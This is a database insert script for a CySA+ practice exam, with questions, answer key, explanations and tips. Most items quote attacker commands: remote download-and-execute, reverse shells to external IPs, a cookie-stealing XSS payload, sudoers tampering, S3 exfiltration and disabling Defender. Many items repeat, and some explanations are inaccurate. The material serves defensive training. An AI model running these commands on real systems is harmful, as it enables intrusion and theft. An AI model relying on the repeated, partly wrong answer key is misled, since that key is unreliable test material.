db.tests.insertOne({
  "category": "cysa",
  "testId": 10,
  "testName": "CySa+ Practice Test #10 (Ultra Level)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "A security analyst reviewing a Windows event log detects the following PowerShell execution:\n\n`powershell.exe -ep bypass -nop -w hidden -c \"IEX((New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1'))\"`\n\nWhat is the attacker's primary objective?",
      "options": [
        "Executing fileless malware directly in memory",
        "Disabling Windows Defender real-time protection",
        "Dumping credentials from LSASS",
        "Performing a Kerberoasting attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command downloads and executes a remote PowerShell script directly in memory to evade disk-based detection.",
      "examTip": "Monitor PowerShell execution logs and restrict execution policies to prevent fileless malware attacks."
    },
    {
      "id": 2,
      "question": "An attacker successfully gains access to a Linux server and executes the following command:\n\n`echo '0 3 * * * root /usr/bin/curl -s http://malicious.com/backdoor.sh | bash' >> /etc/crontab`\n\nWhat is the purpose of this command?",
      "options": [
        "Establishing persistence by scheduling a hidden backdoor execution",
        "Disabling firewall rules to allow remote access",
        "Performing privilege escalation via kernel exploitation",
        "Wiping system logs to evade detection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command schedules a cron job that downloads and executes a backdoor script every night at 3 AM.",
      "examTip": "Monitor cron job modifications and restrict write access to `/etc/crontab`."
    },
    {
      "id": 3,
      "question": "A penetration tester executes the following Nmap command:\n\n`nmap --script http-shellshock -p 80,443 <target>`\n\nWhat is the tester attempting to accomplish?",
      "options": [
        "Exploiting the Shellshock vulnerability in a web server",
        "Performing a denial-of-service attack",
        "Enumerating open HTTP ports",
        "Brute-forcing web application credentials"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `http-shellshock` script detects and exploits the Shellshock vulnerability (CVE-2014-6271) in web servers.",
      "examTip": "Patch all Bash vulnerabilities and restrict untrusted CGI script execution."
    },
    {
      "id": 4,
      "question": "A forensic investigator reviewing system logs finds the following suspicious activity:\n\n`Event ID: 1102 | Source: Microsoft-Windows-Eventlog | Message: The audit log was cleared.`\n\nWhat does this indicate?",
      "options": [
        "An attacker attempting to cover their tracks by clearing logs",
        "A normal log rotation process",
        "A system reboot event",
        "A scheduled task running log cleanup"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Event ID 1102 indicates that an attacker has cleared Windows event logs to remove forensic evidence.",
      "examTip": "Use event log forwarding to send logs to a secure central location before they can be deleted."
    },
    {
      "id": 5,
      "question": "A penetration tester runs the following command on an Active Directory network:\n\n`bloodhound-python -c All -u pentest -p Password123 -d corp.local`\n\nWhat is the tester attempting to do?",
      "options": [
        "Enumerate Active Directory relationships for privilege escalation paths",
        "Perform Kerberoasting to extract service account credentials",
        "Dump NTLM password hashes from a domain controller",
        "Scan for open SMB ports on a target network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "BloodHound maps Active Directory relationships to help identify privilege escalation paths.",
      "examTip": "Monitor for unauthorized AD enumeration and limit unnecessary user privileges."
    },
    {
      "id": 6,
      "question": "A security analyst detects repeated failed authentication attempts followed by a successful login from the same IP using a privileged account. What is the MOST likely attack technique?",
      "options": [
        "Credential stuffing",
        "Pass-the-hash attack",
        "Kerberoasting attack",
        "SQL injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Credential stuffing involves using leaked credentials to gain unauthorized access, which matches the observed pattern.",
      "examTip": "Enforce multi-factor authentication (MFA) and monitor failed login attempts for anomalies."
    },
    {
      "id": 7,
      "question": "A forensic analyst discovers the following encoded command executed on a compromised Linux system:\n\n`echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuMTAvNDQzIDA+JjE=' | base64 -d | bash`\n\nWhat is the attacker attempting to do?",
      "options": [
        "Establish a reverse shell to an external IP address",
        "Exfiltrate sensitive data via DNS tunneling",
        "Perform a brute-force attack on SSH credentials",
        "Inject a malicious payload into kernel memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Decoding the Base64 string reveals a command that initiates a reverse shell connection via Netcat.",
      "examTip": "Monitor for encoded commands and analyze Base64-decoded scripts for malicious intent."
    },
    {
      "id": 8,
      "question": "An attacker successfully compromises an AWS environment and executes the following command:\n\n`aws s3 cp s3://sensitive-data-bucket s3://attacker-bucket --recursive`\n\nWhat is the attacker's goal?",
      "options": [
        "Exfiltrating all files from a compromised S3 bucket",
        "Enumerating active IAM roles",
        "Compromising EC2 metadata for privilege escalation",
        "Gaining shell access to a cloud instance"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command copies all files from a target S3 bucket to an attacker-controlled bucket for exfiltration.",
      "examTip": "Use S3 bucket policies to restrict unauthorized copying and enable logging for all API actions."
    },
    {
      "id": 9,
      "question": "A penetration tester executes the following command:\n\n`hashcat -m 22000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a`\n\nWhat type of attack is being performed?",
      "options": [
        "Brute-forcing WPA2 Wi-Fi handshake hashes",
        "Cracking NTLM password hashes",
        "Performing a pass-the-hash attack",
        "Decrypting SSL/TLS traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hashcat with `-m 22000` targets WPA2 Wi-Fi handshake hashes using a brute-force attack.",
      "examTip": "Use strong, unique Wi-Fi passwords and enable WPA3 where possible to mitigate brute-force attacks."
    },
    {
      "id": 10,
      "question": "A forensic analyst detects a suspicious scheduled task with the following command:\n\n`schtasks /create /sc minute /mo 5 /tn 'Updater' /tr 'C:\\Users\\Public\\malware.exe'`\n\nWhat is the attacker's goal?",
      "options": [
        "Setting up a scheduled task that runs malware every 5 minutes",
        "Clearing Windows event logs",
        "Scanning the local network for open ports",
        "Performing a brute-force attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `schtasks` command schedules a malicious executable to run every 5 minutes, ensuring persistence.",
      "examTip": "Regularly audit scheduled tasks and remove unauthorized entries."
    },
    {
      "id": 11,
      "question": "A security analyst detects a suspicious command executed on a compromised Windows machine:\n\n`rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"`\n\nWhat is the attacker's objective?",
      "options": [
        "Executing JavaScript in a Windows environment to bypass security policies",
        "Disabling Windows event logging",
        "Escalating privileges to SYSTEM",
        "Exfiltrating NTLM hashes via SMB relay"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command abuses `rundll32.exe` to execute JavaScript, which can be used to launch malware without triggering security controls.",
      "examTip": "Monitor `rundll32.exe` executions and restrict script execution in Windows environments."
    },
    {
      "id": 12,
      "question": "An attacker successfully compromises a Linux system and modifies the following file:\n\n`echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers`\n\nWhat is the impact of this modification?",
      "options": [
        "Granting all users root privileges without requiring a password",
        "Deleting all user accounts from the system",
        "Injecting a rootkit into the Linux kernel",
        "Hijacking the SSH daemon for credential harvesting"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Appending this line to `/etc/sudoers` allows any user to execute commands as root without a password.",
      "examTip": "Regularly audit the `/etc/sudoers` file and enforce least privilege principles."
    },
    {
      "id": 13,
      "question": "A penetration tester executes the following command:\n\n`nmap --script ldap-rootdse -p 389 <target>`\n\nWhat is the purpose of this scan?",
      "options": [
        "Extracting LDAP domain information from an Active Directory server",
        "Brute-forcing LDAP credentials",
        "Enumerating SMB shares on a domain controller",
        "Exfiltrating hashed passwords from an LDAP database"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `ldap-rootdse` script retrieves domain-related information from an LDAP server, which can aid in further attacks.",
      "examTip": "Monitor LDAP queries and restrict anonymous access to sensitive directory information."
    },
    {
      "id": 14,
      "question": "A forensic investigator detects a suspicious cron job on a compromised Linux machine:\n\n`*/5 * * * * root python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"203.0.113.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'`\n\nWhat is the attacker's intent?",
      "options": [
        "Maintaining persistence by setting up a reverse shell every 5 minutes",
        "Performing a denial-of-service attack against the system",
        "Exfiltrating sensitive system logs to a remote server",
        "Dumping credentials from `/etc/shadow`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This cron job runs every 5 minutes and establishes a reverse shell connection to the attacker's machine.",
      "examTip": "Monitor and restrict unauthorized cron job modifications."
    },
    {
      "id": 15,
      "question": "A penetration tester executes the following command:\n\n`hashcat -m 18200 -a 0 hashlist.txt wordlist.txt`\n\nWhat is the tester attempting to do?",
      "options": [
        "Cracking encrypted KeePass password vault hashes",
        "Performing a brute-force attack on a remote SSH server",
        "Decrypting Windows BitLocker encryption keys",
        "Dumping password hashes from an Active Directory database"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hashcat mode `18200` is used to crack KeePass password vault hashes using a dictionary attack.",
      "examTip": "Use strong master passwords and enable two-factor authentication for password vaults."
    },
    {
      "id": 16,
      "question": "An attacker executes the following command on a Linux system:\n\n`iptables -A INPUT -p tcp --dport 22 -j DROP`\n\nWhat is the impact of this command?",
      "options": [
        "Blocking SSH access to prevent administrators from regaining control",
        "Redirecting SSH traffic to a malicious proxy",
        "Creating a new firewall rule to allow persistent access",
        "Disabling logging for SSH sessions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "By blocking inbound SSH traffic, the attacker prevents administrators from remotely accessing the compromised machine.",
      "examTip": "Monitor firewall rule changes and use centralized logging for security event tracking."
    },
    {
      "id": 17,
      "question": "An attacker executes the following SQL query:\n\n`SELECT username, password FROM users WHERE username='admin' --' AND password='password'`;\n\nWhat type of attack is being performed?",
      "options": [
        "SQL injection to bypass authentication",
        "Cross-site scripting (XSS)",
        "Remote code execution (RCE)",
        "Privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is using SQL injection to manipulate the authentication query logic and bypass login security.",
      "examTip": "Use parameterized queries and input validation to prevent SQL injection attacks."
    },
    {
      "id": 18,
      "question": "A forensic investigator reviewing Active Directory logs detects the following:\n\n`Event ID: 4769 | Account Name: service-account | Service Name: ldap/corp.local | Ticket Encryption Type: 0x17`\n\nWhat does this log entry suggest?",
      "options": [
        "A successful Kerberoasting attack against a service account",
        "A normal LDAP authentication request",
        "A brute-force attack against Active Directory",
        "A pass-the-hash attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Ticket Encryption Type `0x17` (RC4) suggests that a Kerberos service ticket was requested, potentially for a Kerberoasting attack.",
      "examTip": "Monitor for unusual Kerberos ticket requests and enforce strong passwords for service accounts."
    },
    {
      "id": 19,
      "question": "An attacker exploits a misconfigured S3 bucket and runs the following command:\n\n`aws s3 cp s3://sensitive-data-bucket s3://attacker-bucket --recursive`\n\nWhat is the attacker's goal?",
      "options": [
        "Exfiltrating all files from a compromised S3 bucket",
        "Enumerating active IAM roles",
        "Compromising EC2 metadata for privilege escalation",
        "Gaining shell access to a cloud instance"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command copies all files from a target S3 bucket to an attacker-controlled bucket for exfiltration.",
      "examTip": "Use S3 bucket policies to restrict unauthorized copying and enable logging for all API actions."
    },
    {
      "id": 20,
      "question": "A penetration tester executes the following command:\n\n`hashcat -m 22000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a`\n\nWhat type of attack is being performed?",
      "options": [
        "Brute-forcing WPA2 Wi-Fi handshake hashes",
        "Cracking NTLM password hashes",
        "Performing a pass-the-hash attack",
        "Decrypting SSL/TLS traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hashcat with `-m 22000` targets WPA2 Wi-Fi handshake hashes using a brute-force attack.",
      "examTip": "Use strong, unique Wi-Fi passwords and enable WPA3 where possible to mitigate brute-force attacks."
    },
    {
      "id": 21,
      "question": "A forensic analyst detects the following encoded command executed on a compromised Linux system:\n\n`echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuMTAvNDQzIDA+JjE=' | base64 -d | bash`\n\nWhat is the attacker's intent?",
      "options": [
        "Establishing a reverse shell to an external IP address",
        "Exfiltrating sensitive data via DNS tunneling",
        "Performing a brute-force attack on SSH credentials",
        "Injecting a malicious payload into kernel memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Decoding the Base64 string reveals a command that initiates a reverse shell connection via Netcat.",
      "examTip": "Monitor for encoded commands and analyze Base64-decoded scripts for malicious intent."
    },
    {
      "id": 22,
      "question": "An attacker executes the following command on a compromised Windows machine:\n\n`powershell -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAbQBzAG0AYAAnAA==`\n\nWhat is the FIRST action a security analyst should take?",
      "options": [
        "Decode the Base64 command and analyze its intent",
        "Immediately block all PowerShell executions",
        "Terminate all running PowerShell instances",
        "Reboot the machine to remove any running scripts"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command is Base64-encoded, requiring decoding to understand its purpose before taking remediation steps.",
      "examTip": "Always decode and analyze encoded PowerShell commands before executing countermeasures."
    },
    {
      "id": 23,
      "question": "A penetration tester executes the following Nmap command:\n\n`nmap -sU -p 161 --script=snmp-brute <target>`\n\nWhat is the tester attempting to accomplish?",
      "options": [
        "Brute-forcing SNMP community strings to gain unauthorized access",
        "Scanning for open RDP ports",
        "Performing a denial-of-service attack",
        "Bypassing network firewall restrictions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `snmp-brute` script attempts to brute-force SNMP community strings, which can provide access to network devices.",
      "examTip": "Disable SNMP if not needed or enforce strong community strings to prevent unauthorized access."
    },
    {
      "id": 24,
      "question": "An organization wants to embed a formal risk culture throughout all levels of its operations to comply with new industry standards. Which of the following actions is MOST effective as the initial step in fostering a sustainable risk-aware environment?",
      "options": [
        "Distribute a zero-tolerance risk policy and demand strict adherence from all personnel immediately.",
        "Require employees to pass a one-time certification exam on the organization’s risk policies.",
        "Create an ongoing training and awareness program to gradually integrate risk considerations into daily workflows.",
        "Hire a dedicated risk officer solely responsible for maintaining compliance with the new standards."
      ],
      "correctAnswerIndex": 2,
      "explanation": "A continuous training and awareness initiative ensures risk concepts become part of the day-to-day mindset rather than a one-time requirement. Making a single individual responsible or adopting an abrupt zero-tolerance policy won’t embed risk culture deeply across the organization.",
      "examTip": "Cultivating a risk-aware culture requires sustained, iterative training that connects daily actions to broader compliance goals."
    },
    {
      "id": 25,
      "question": "An attacker modifies the following Windows registry key:\n\n`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d \"C:\\Users\\Public\\malware.exe\" /f`\n\nWhat is the attacker's goal?",
      "options": [
        "Establishing persistence by executing malware at user login",
        "Disabling Windows Defender security policies",
        "Exfiltrating user credentials from the Windows registry",
        "Escalating privileges to a domain administrator"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The registry key ensures that the malware runs every time the user logs in, maintaining persistence.",
      "examTip": "Monitor registry modifications and enforce least privilege access controls."
    },
    {
      "id": 26,
      "question": "An attacker exploits a vulnerable web application and injects the following payload:\n\n`<script>document.location='http://malicious.com/steal.php?cookie='+document.cookie;</script>`\n\nWhat type of attack is being performed?",
      "options": [
        "Stored cross-site scripting (XSS)",
        "SQL injection",
        "Remote code execution (RCE)",
        "Server-side request forgery (SSRF)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This JavaScript payload exfiltrates cookies to an external server, indicating a stored XSS attack.",
      "examTip": "Use Content Security Policy (CSP) headers and input validation to prevent XSS attacks."
    },
    {
      "id": 27,
      "question": "A penetration tester executes the following command:\n\n`hashcat -m 22000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a`\n\nWhat type of attack is being performed?",
      "options": [
        "Brute-forcing WPA2 Wi-Fi handshake hashes",
        "Cracking NTLM password hashes",
        "Performing a pass-the-hash attack",
        "Decrypting SSL/TLS traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hashcat with `-m 22000` targets WPA2 Wi-Fi handshake hashes using a brute-force attack.",
      "examTip": "Use strong, unique Wi-Fi passwords and enable WPA3 where possible to mitigate brute-force attacks."
    },
    {
      "id": 28,
      "question": "An attacker successfully compromises an AWS environment and executes the following command:\n\n`aws s3 cp s3://sensitive-data-bucket s3://attacker-bucket --recursive`\n\nWhat is the attacker's goal?",
      "options": [
        "Exfiltrating all files from a compromised S3 bucket",
        "Enumerating active IAM roles",
        "Compromising EC2 metadata for privilege escalation",
        "Gaining shell access to a cloud instance"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command copies all files from a target S3 bucket to an attacker-controlled bucket for exfiltration.",
      "examTip": "Use S3 bucket policies to restrict unauthorized copying and enable logging for all API actions."
    },
    {
      "id": 29,
      "question": "A forensic analyst detects a suspicious scheduled task with the following command:\n\n`schtasks /create /sc minute /mo 5 /tn 'Updater' /tr 'C:\\Users\\Public\\malware.exe'`\n\nWhat is the attacker's goal?",
      "options": [
        "Setting up a scheduled task that runs malware every 5 minutes",
        "Clearing Windows event logs",
        "Scanning the local network for open ports",
        "Performing a brute-force attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `schtasks` command schedules a malicious executable to run every 5 minutes, ensuring persistence.",
      "examTip": "Regularly audit scheduled tasks and remove unauthorized entries."
    },
    {
      "id": 30,
      "question": "A multinational retail group has identified discrepancies in how each regional office manages vendor contracts and data processing agreements. Which of the following steps should be taken FIRST to ensure consistent risk management and regulatory compliance?",
      "options": [
        "Instruct local offices to submit all vendor contracts for immediate review by a single global legal team.",
        "Require each office to phase out current vendor contracts until they align fully with a new unified standard.",
        "Perform a thorough cross-regional compliance assessment to compare each office’s contract policies to the global standard.",
        "Designate a regional compliance champion to handle contracts independently, based on local preferences."
      ],
      "correctAnswerIndex": 2,
      "explanation": "Conducting a cross-regional assessment reveals which contract terms deviate from the global standard, allowing for strategic adjustments rather than an abrupt, one-size-fits-all directive. This method avoids unnecessary contract terminations and fosters a data-driven approach.",
      "examTip": "Gather detailed insights from each region before deciding on large-scale contract governance changes."
    },
    {
      "id": 31,
      "question": "A forensic analyst reviewing network logs detects a high volume of outbound DNS requests with randomized subdomains, such as:\n\n```\na1b2c3.example.com\nd4e5f6.example.com\ng7h8i9.example.com\n```\n\nWhat is the attacker likely attempting to do?",
      "options": [
        "Using a Domain Generation Algorithm (DGA) for command-and-control (C2) communication",
        "Performing a DNS brute-force attack",
        "Conducting a distributed denial-of-service (DDoS) attack",
        "Spoofing DNS records to redirect traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DGA-based malware generates random subdomains to evade domain blacklisting while maintaining C2 communication.",
      "examTip": "Use DNS filtering and anomaly detection to identify and block DGA-based malware."
    },
    {
      "id": 32,
      "question": "An attacker exploits a misconfigured AWS IAM role and executes the following command:\n\n`aws ec2 describe-instances --region us-east-1`\n\nWhat is the attacker's goal?",
      "options": [
        "Enumerating all EC2 instances in the AWS account",
        "Listing all active IAM users",
        "Exfiltrating sensitive files from an S3 bucket",
        "Brute-forcing credentials for AWS services"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command lists all EC2 instances, which could be used for reconnaissance or lateral movement in a cloud environment.",
      "examTip": "Monitor AWS API calls and use least privilege IAM policies to restrict unauthorized access."
    },
    {
      "id": 33,
      "question": "A penetration tester executes the following command:\n\n`responder -I eth0`\n\nWhat is the primary objective of this action?",
      "options": [
        "Intercepting and poisoning network authentication requests",
        "Performing a brute-force attack on SMB",
        "Enumerating domain controllers in an Active Directory environment",
        "Exfiltrating credentials via HTTP requests"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Responder is used to poison LLMNR/NBT-NS requests to capture and relay credentials in network environments.",
      "examTip": "Disable LLMNR and NBT-NS on corporate networks to prevent credential theft."
    },
    {
      "id": 34,
      "question": "A forensic analyst reviewing endpoint logs finds the following PowerShell execution:\n\n`powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAbQBzAG0AYAAnAA==`\n\nWhat should the analyst do FIRST?",
      "options": [
        "Decode the command and analyze its intent",
        "Execute the command in a sandboxed environment",
        "Ignore the event unless further evidence is found",
        "Block all PowerShell scripts on the endpoint"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `-enc` flag indicates Base64 encoding, requiring decoding to determine its true intent before taking action.",
      "examTip": "Always decode and analyze encoded scripts before execution or blocking."
    },
    {
      "id": 35,
      "question": "An attacker modifies firewall rules using the following command:\n\n`iptables -A INPUT -p tcp --dport 22 -s 203.0.113.100 -j ACCEPT`\n\nWhat is the attacker's intent?",
      "options": [
        "Allowing SSH access only from their IP for persistence",
        "Blocking all incoming SSH traffic",
        "Disabling firewall rules for external connections",
        "Redirecting SSH traffic to a different server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command modifies firewall rules to allow SSH connections only from a specific attacker-controlled IP.",
      "examTip": "Monitor firewall rule changes and restrict administrative access to firewall configurations."
    },
    {
      "id": 36,
      "question": "A penetration tester runs the following command on an Active Directory network:\n\n`nltest /dclist:corp.local`\n\nWhat is the objective of this command?",
      "options": [
        "Enumerating all domain controllers in the Active Directory environment",
        "Extracting NTLM password hashes",
        "Performing a pass-the-hash attack",
        "Identifying all users in the domain"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `nltest /dclist` command lists all domain controllers within a specified Active Directory domain.",
      "examTip": "Monitor Active Directory enumeration commands to detect potential reconnaissance activity."
    },
    {
      "id": 37,
      "question": "A security analyst reviewing network logs detects repeated outbound connections to `169.254.169.254/latest/meta-data/iam/security-credentials/`. What is the attacker attempting to do?",
      "options": [
        "Steal AWS IAM credentials from a compromised cloud instance",
        "Exfiltrate SSH keys from the local machine",
        "Perform an SQL injection attack on a cloud database",
        "Enumerate DNS records of the cloud environment"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Requests to `169.254.169.254` indicate an attempt to access cloud instance metadata, which attackers exploit to retrieve IAM credentials.",
      "examTip": "Restrict access to cloud metadata services and enforce IMDSv2 in AWS environments."
    },
    {
      "id": 38,
      "question": "An attacker runs the following command on a compromised Linux system:\n\n`nohup nc -e /bin/bash 203.0.113.10 4444 &`\n\nWhat is the attacker trying to achieve?",
      "options": [
        "Establishing a persistent reverse shell",
        "Scanning the local network for open ports",
        "Modifying user privileges",
        "Executing a denial-of-service attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `nohup` command ensures the process persists after logout, and Netcat is used to establish a reverse shell.",
      "examTip": "Monitor outbound connections and block unauthorized remote shells."
    },
    {
      "id": 39,
      "question": "An attacker executes the following command on a compromised Linux machine:\n\n`iptables -A INPUT -p tcp --dport 22 -j DROP`\n\nWhat is the attacker's likely goal?",
      "options": [
        "Blocking SSH access to prevent administrators from regaining control",
        "Redirecting SSH traffic to a malicious proxy",
        "Creating a new firewall rule to allow persistent access",
        "Disabling logging for SSH sessions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "By blocking inbound SSH traffic, the attacker prevents administrators from remotely accessing the compromised machine.",
      "examTip": "Monitor firewall rule changes and use centralized logging for security event tracking."
    },
    {
      "id": 40,
      "question": "A forensic analyst finds the following suspicious cron job on a compromised Linux machine:\n\n`*/5 * * * * root /bin/bash -c \"nc -e /bin/bash 203.0.113.10 4444\"`\n\nWhat is the attacker's intent?",
      "options": [
        "Establishing a persistent reverse shell via cron job execution",
        "Dumping credentials from `/etc/shadow`",
        "Disabling firewall rules to allow inbound traffic",
        "Overwriting critical system logs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This cron job executes a Netcat reverse shell every 5 minutes, ensuring persistent access for the attacker.",
      "examTip": "Monitor cron job modifications and restrict write access to `/etc/crontab`."
    },
    {
      "id": 41,
      "question": "A security analyst detects the following PowerShell execution on a Windows server:\n\n`Set-MpPreference -DisableRealtimeMonitoring $true`\n\nWhat is the significance of this command?",
      "options": [
        "Disabling Windows Defender real-time protection",
        "Dumping credentials from LSASS memory",
        "Exfiltrating data using encoded HTTP requests",
        "Clearing system event logs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This PowerShell command disables Windows Defender's real-time protection, allowing malware execution without detection.",
      "examTip": "Monitor security policy changes and restrict PowerShell execution policies."
    },
    {
      "id": 42,
      "question": "A forensic analyst reviewing endpoint logs finds the following encoded PowerShell command:\n\n`cG93ZXJzaGVsbCAtZXhlYyBieXBhc3MgLWNvbW1hbmQgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZQ==`\n\nWhat does the attacker aim to achieve?",
      "options": [
        "Disabling Windows Defender’s real-time monitoring",
        "Encrypting files to deploy ransomware",
        "Exfiltrating NTLM hashes from memory",
        "Creating a hidden user account"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Decoding the Base64 command reveals a command to disable Windows Defender real-time monitoring.",
      "examTip": "Monitor PowerShell execution logs and enforce security controls to prevent unauthorized configuration changes."
    },
    {
      "id": 43,
      "question": "A penetration tester runs the following command:\n\n`hashcat -m 5600 -a 0 hashes.txt wordlist.txt`\n\nWhat type of hashes is the tester attempting to crack?",
      "options": [
        "NetNTLMv2 authentication hashes",
        "MD5 password hashes",
        "SHA-256 encrypted keys",
        "Kerberos ticket hashes"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `-m 5600` flag in Hashcat is used for cracking NetNTLMv2 authentication hashes.",
      "examTip": "Enforce strong password policies and use multi-factor authentication to reduce the risk of credential compromise."
    },
    {
      "id": 44,
      "question": "An attacker compromises an Active Directory environment and executes the following command:\n\n`dcsync /user:Administrator /domain:corp.local`\n\nWhat is the attacker's likely goal?",
      "options": [
        "Extracting NTLM password hashes directly from the domain controller",
        "Creating a new domain administrator account",
        "Enumerating Active Directory groups",
        "Disabling security auditing on the domain controller"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `dcsync` command allows an attacker to pull NTLM hashes directly from the domain controller, a critical credential theft technique.",
      "examTip": "Monitor for unauthorized `dcsync` activity and enforce tiered administrative access controls."
    },
    {
      "id": 45,
      "question": "A forensic analyst detects the following command executed on a compromised system:\n\n`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n\nWhat is the attacker's objective?",
      "options": [
        "Stealing cloud instance metadata and IAM credentials",
        "Scanning the local network for open ports",
        "Bypassing a firewall using an internal proxy",
        "Performing a SQL injection attack on a cloud database"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Requests to `169.254.169.254` indicate an attempt to access cloud instance metadata, which attackers exploit to retrieve IAM credentials.",
      "examTip": "Restrict access to cloud metadata services and enforce IMDSv2 in AWS environments."
    },
    {
      "id": 46,
      "question": "An attacker executes the following SQL query:\n\n`SELECT username, password FROM users WHERE username='admin' --' AND password='password'`;\n\nWhat type of attack is being performed?",
      "options": [
        "SQL injection to bypass authentication",
        "Cross-site scripting (XSS)",
        "Remote code execution (RCE)",
        "Privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is using SQL injection to manipulate the authentication query logic and bypass login security.",
      "examTip": "Use parameterized queries and input validation to prevent SQL injection attacks."
    },
    {
      "id": 47,
      "question": "A penetration tester executes the following command:\n\n`nmap --script ldap-rootdse -p 389 <target>`\n\nWhat is the purpose of this scan?",
      "options": [
        "Extracting LDAP domain information from an Active Directory server",
        "Brute-forcing LDAP credentials",
        "Enumerating SMB shares on a domain controller",
        "Exfiltrating hashed passwords from an LDAP database"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `ldap-rootdse` script retrieves domain-related information from an LDAP server, which can aid in further attacks.",
      "examTip": "Monitor LDAP queries and restrict anonymous access to sensitive directory information."
    },
    {
      "id": 48,
      "question": "An attacker modifies the following Windows registry key:\n\n`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d \"C:\\Users\\Public\\malware.exe\" /f`\n\nWhat is the attacker's intent?",
      "options": [
        "Establishing persistence by executing malware at user login",
        "Disabling Windows security policies",
        "Exfiltrating user credentials from the Windows registry",
        "Escalating privileges to a domain administrator"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The registry key ensures that the malware runs every time the user logs in, maintaining persistence.",
      "examTip": "Monitor registry modifications and enforce least privilege access controls."
    },
    {
      "id": 49,
      "question": "An attacker successfully exploits an AWS environment and executes the following command:\n\n`aws s3 cp s3://sensitive-data-bucket s3://attacker-bucket --recursive`\n\nWhat is the attacker's goal?",
      "options": [
        "Exfiltrating all files from a compromised S3 bucket",
        "Enumerating active IAM roles",
        "Compromising EC2 metadata for privilege escalation",
        "Gaining shell access to a cloud instance"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command copies all files from a target S3 bucket to an attacker-controlled bucket for exfiltration.",
      "examTip": "Use S3 bucket policies to restrict unauthorized copying and enable logging for all API actions."
    },
    {
      "id": 50,
      "question": "A penetration tester executes the following command:\n\n`hashcat -m 22000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a`\n\nWhat type of attack is being performed?",
      "options": [
        "Brute-forcing WPA2 Wi-Fi handshake hashes",
        "Cracking NTLM password hashes",
        "Performing a pass-the-hash attack",
        "Decrypting SSL/TLS traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hashcat with `-m 22000` targets WPA2 Wi-Fi handshake hashes using a brute-force attack.",
      "examTip": "Use strong, unique Wi-Fi passwords and enable WPA3 where possible to mitigate brute-force attacks."
    },
    {
      "id": 51,
      "question": "A penetration tester executes the following command on an internal network:\n\n`impacket-secretsdump administrator@10.0.0.5`\n\nWhat is the tester attempting to do?",
      "options": [
        "Extract NTLM password hashes from a Windows system",
        "Perform a brute-force attack on the domain controller",
        "Intercept SMB authentication requests",
        "Deploy a reverse shell on the target machine"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `secretsdump` tool from Impacket extracts NTLM hashes, which can be used in pass-the-hash attacks.",
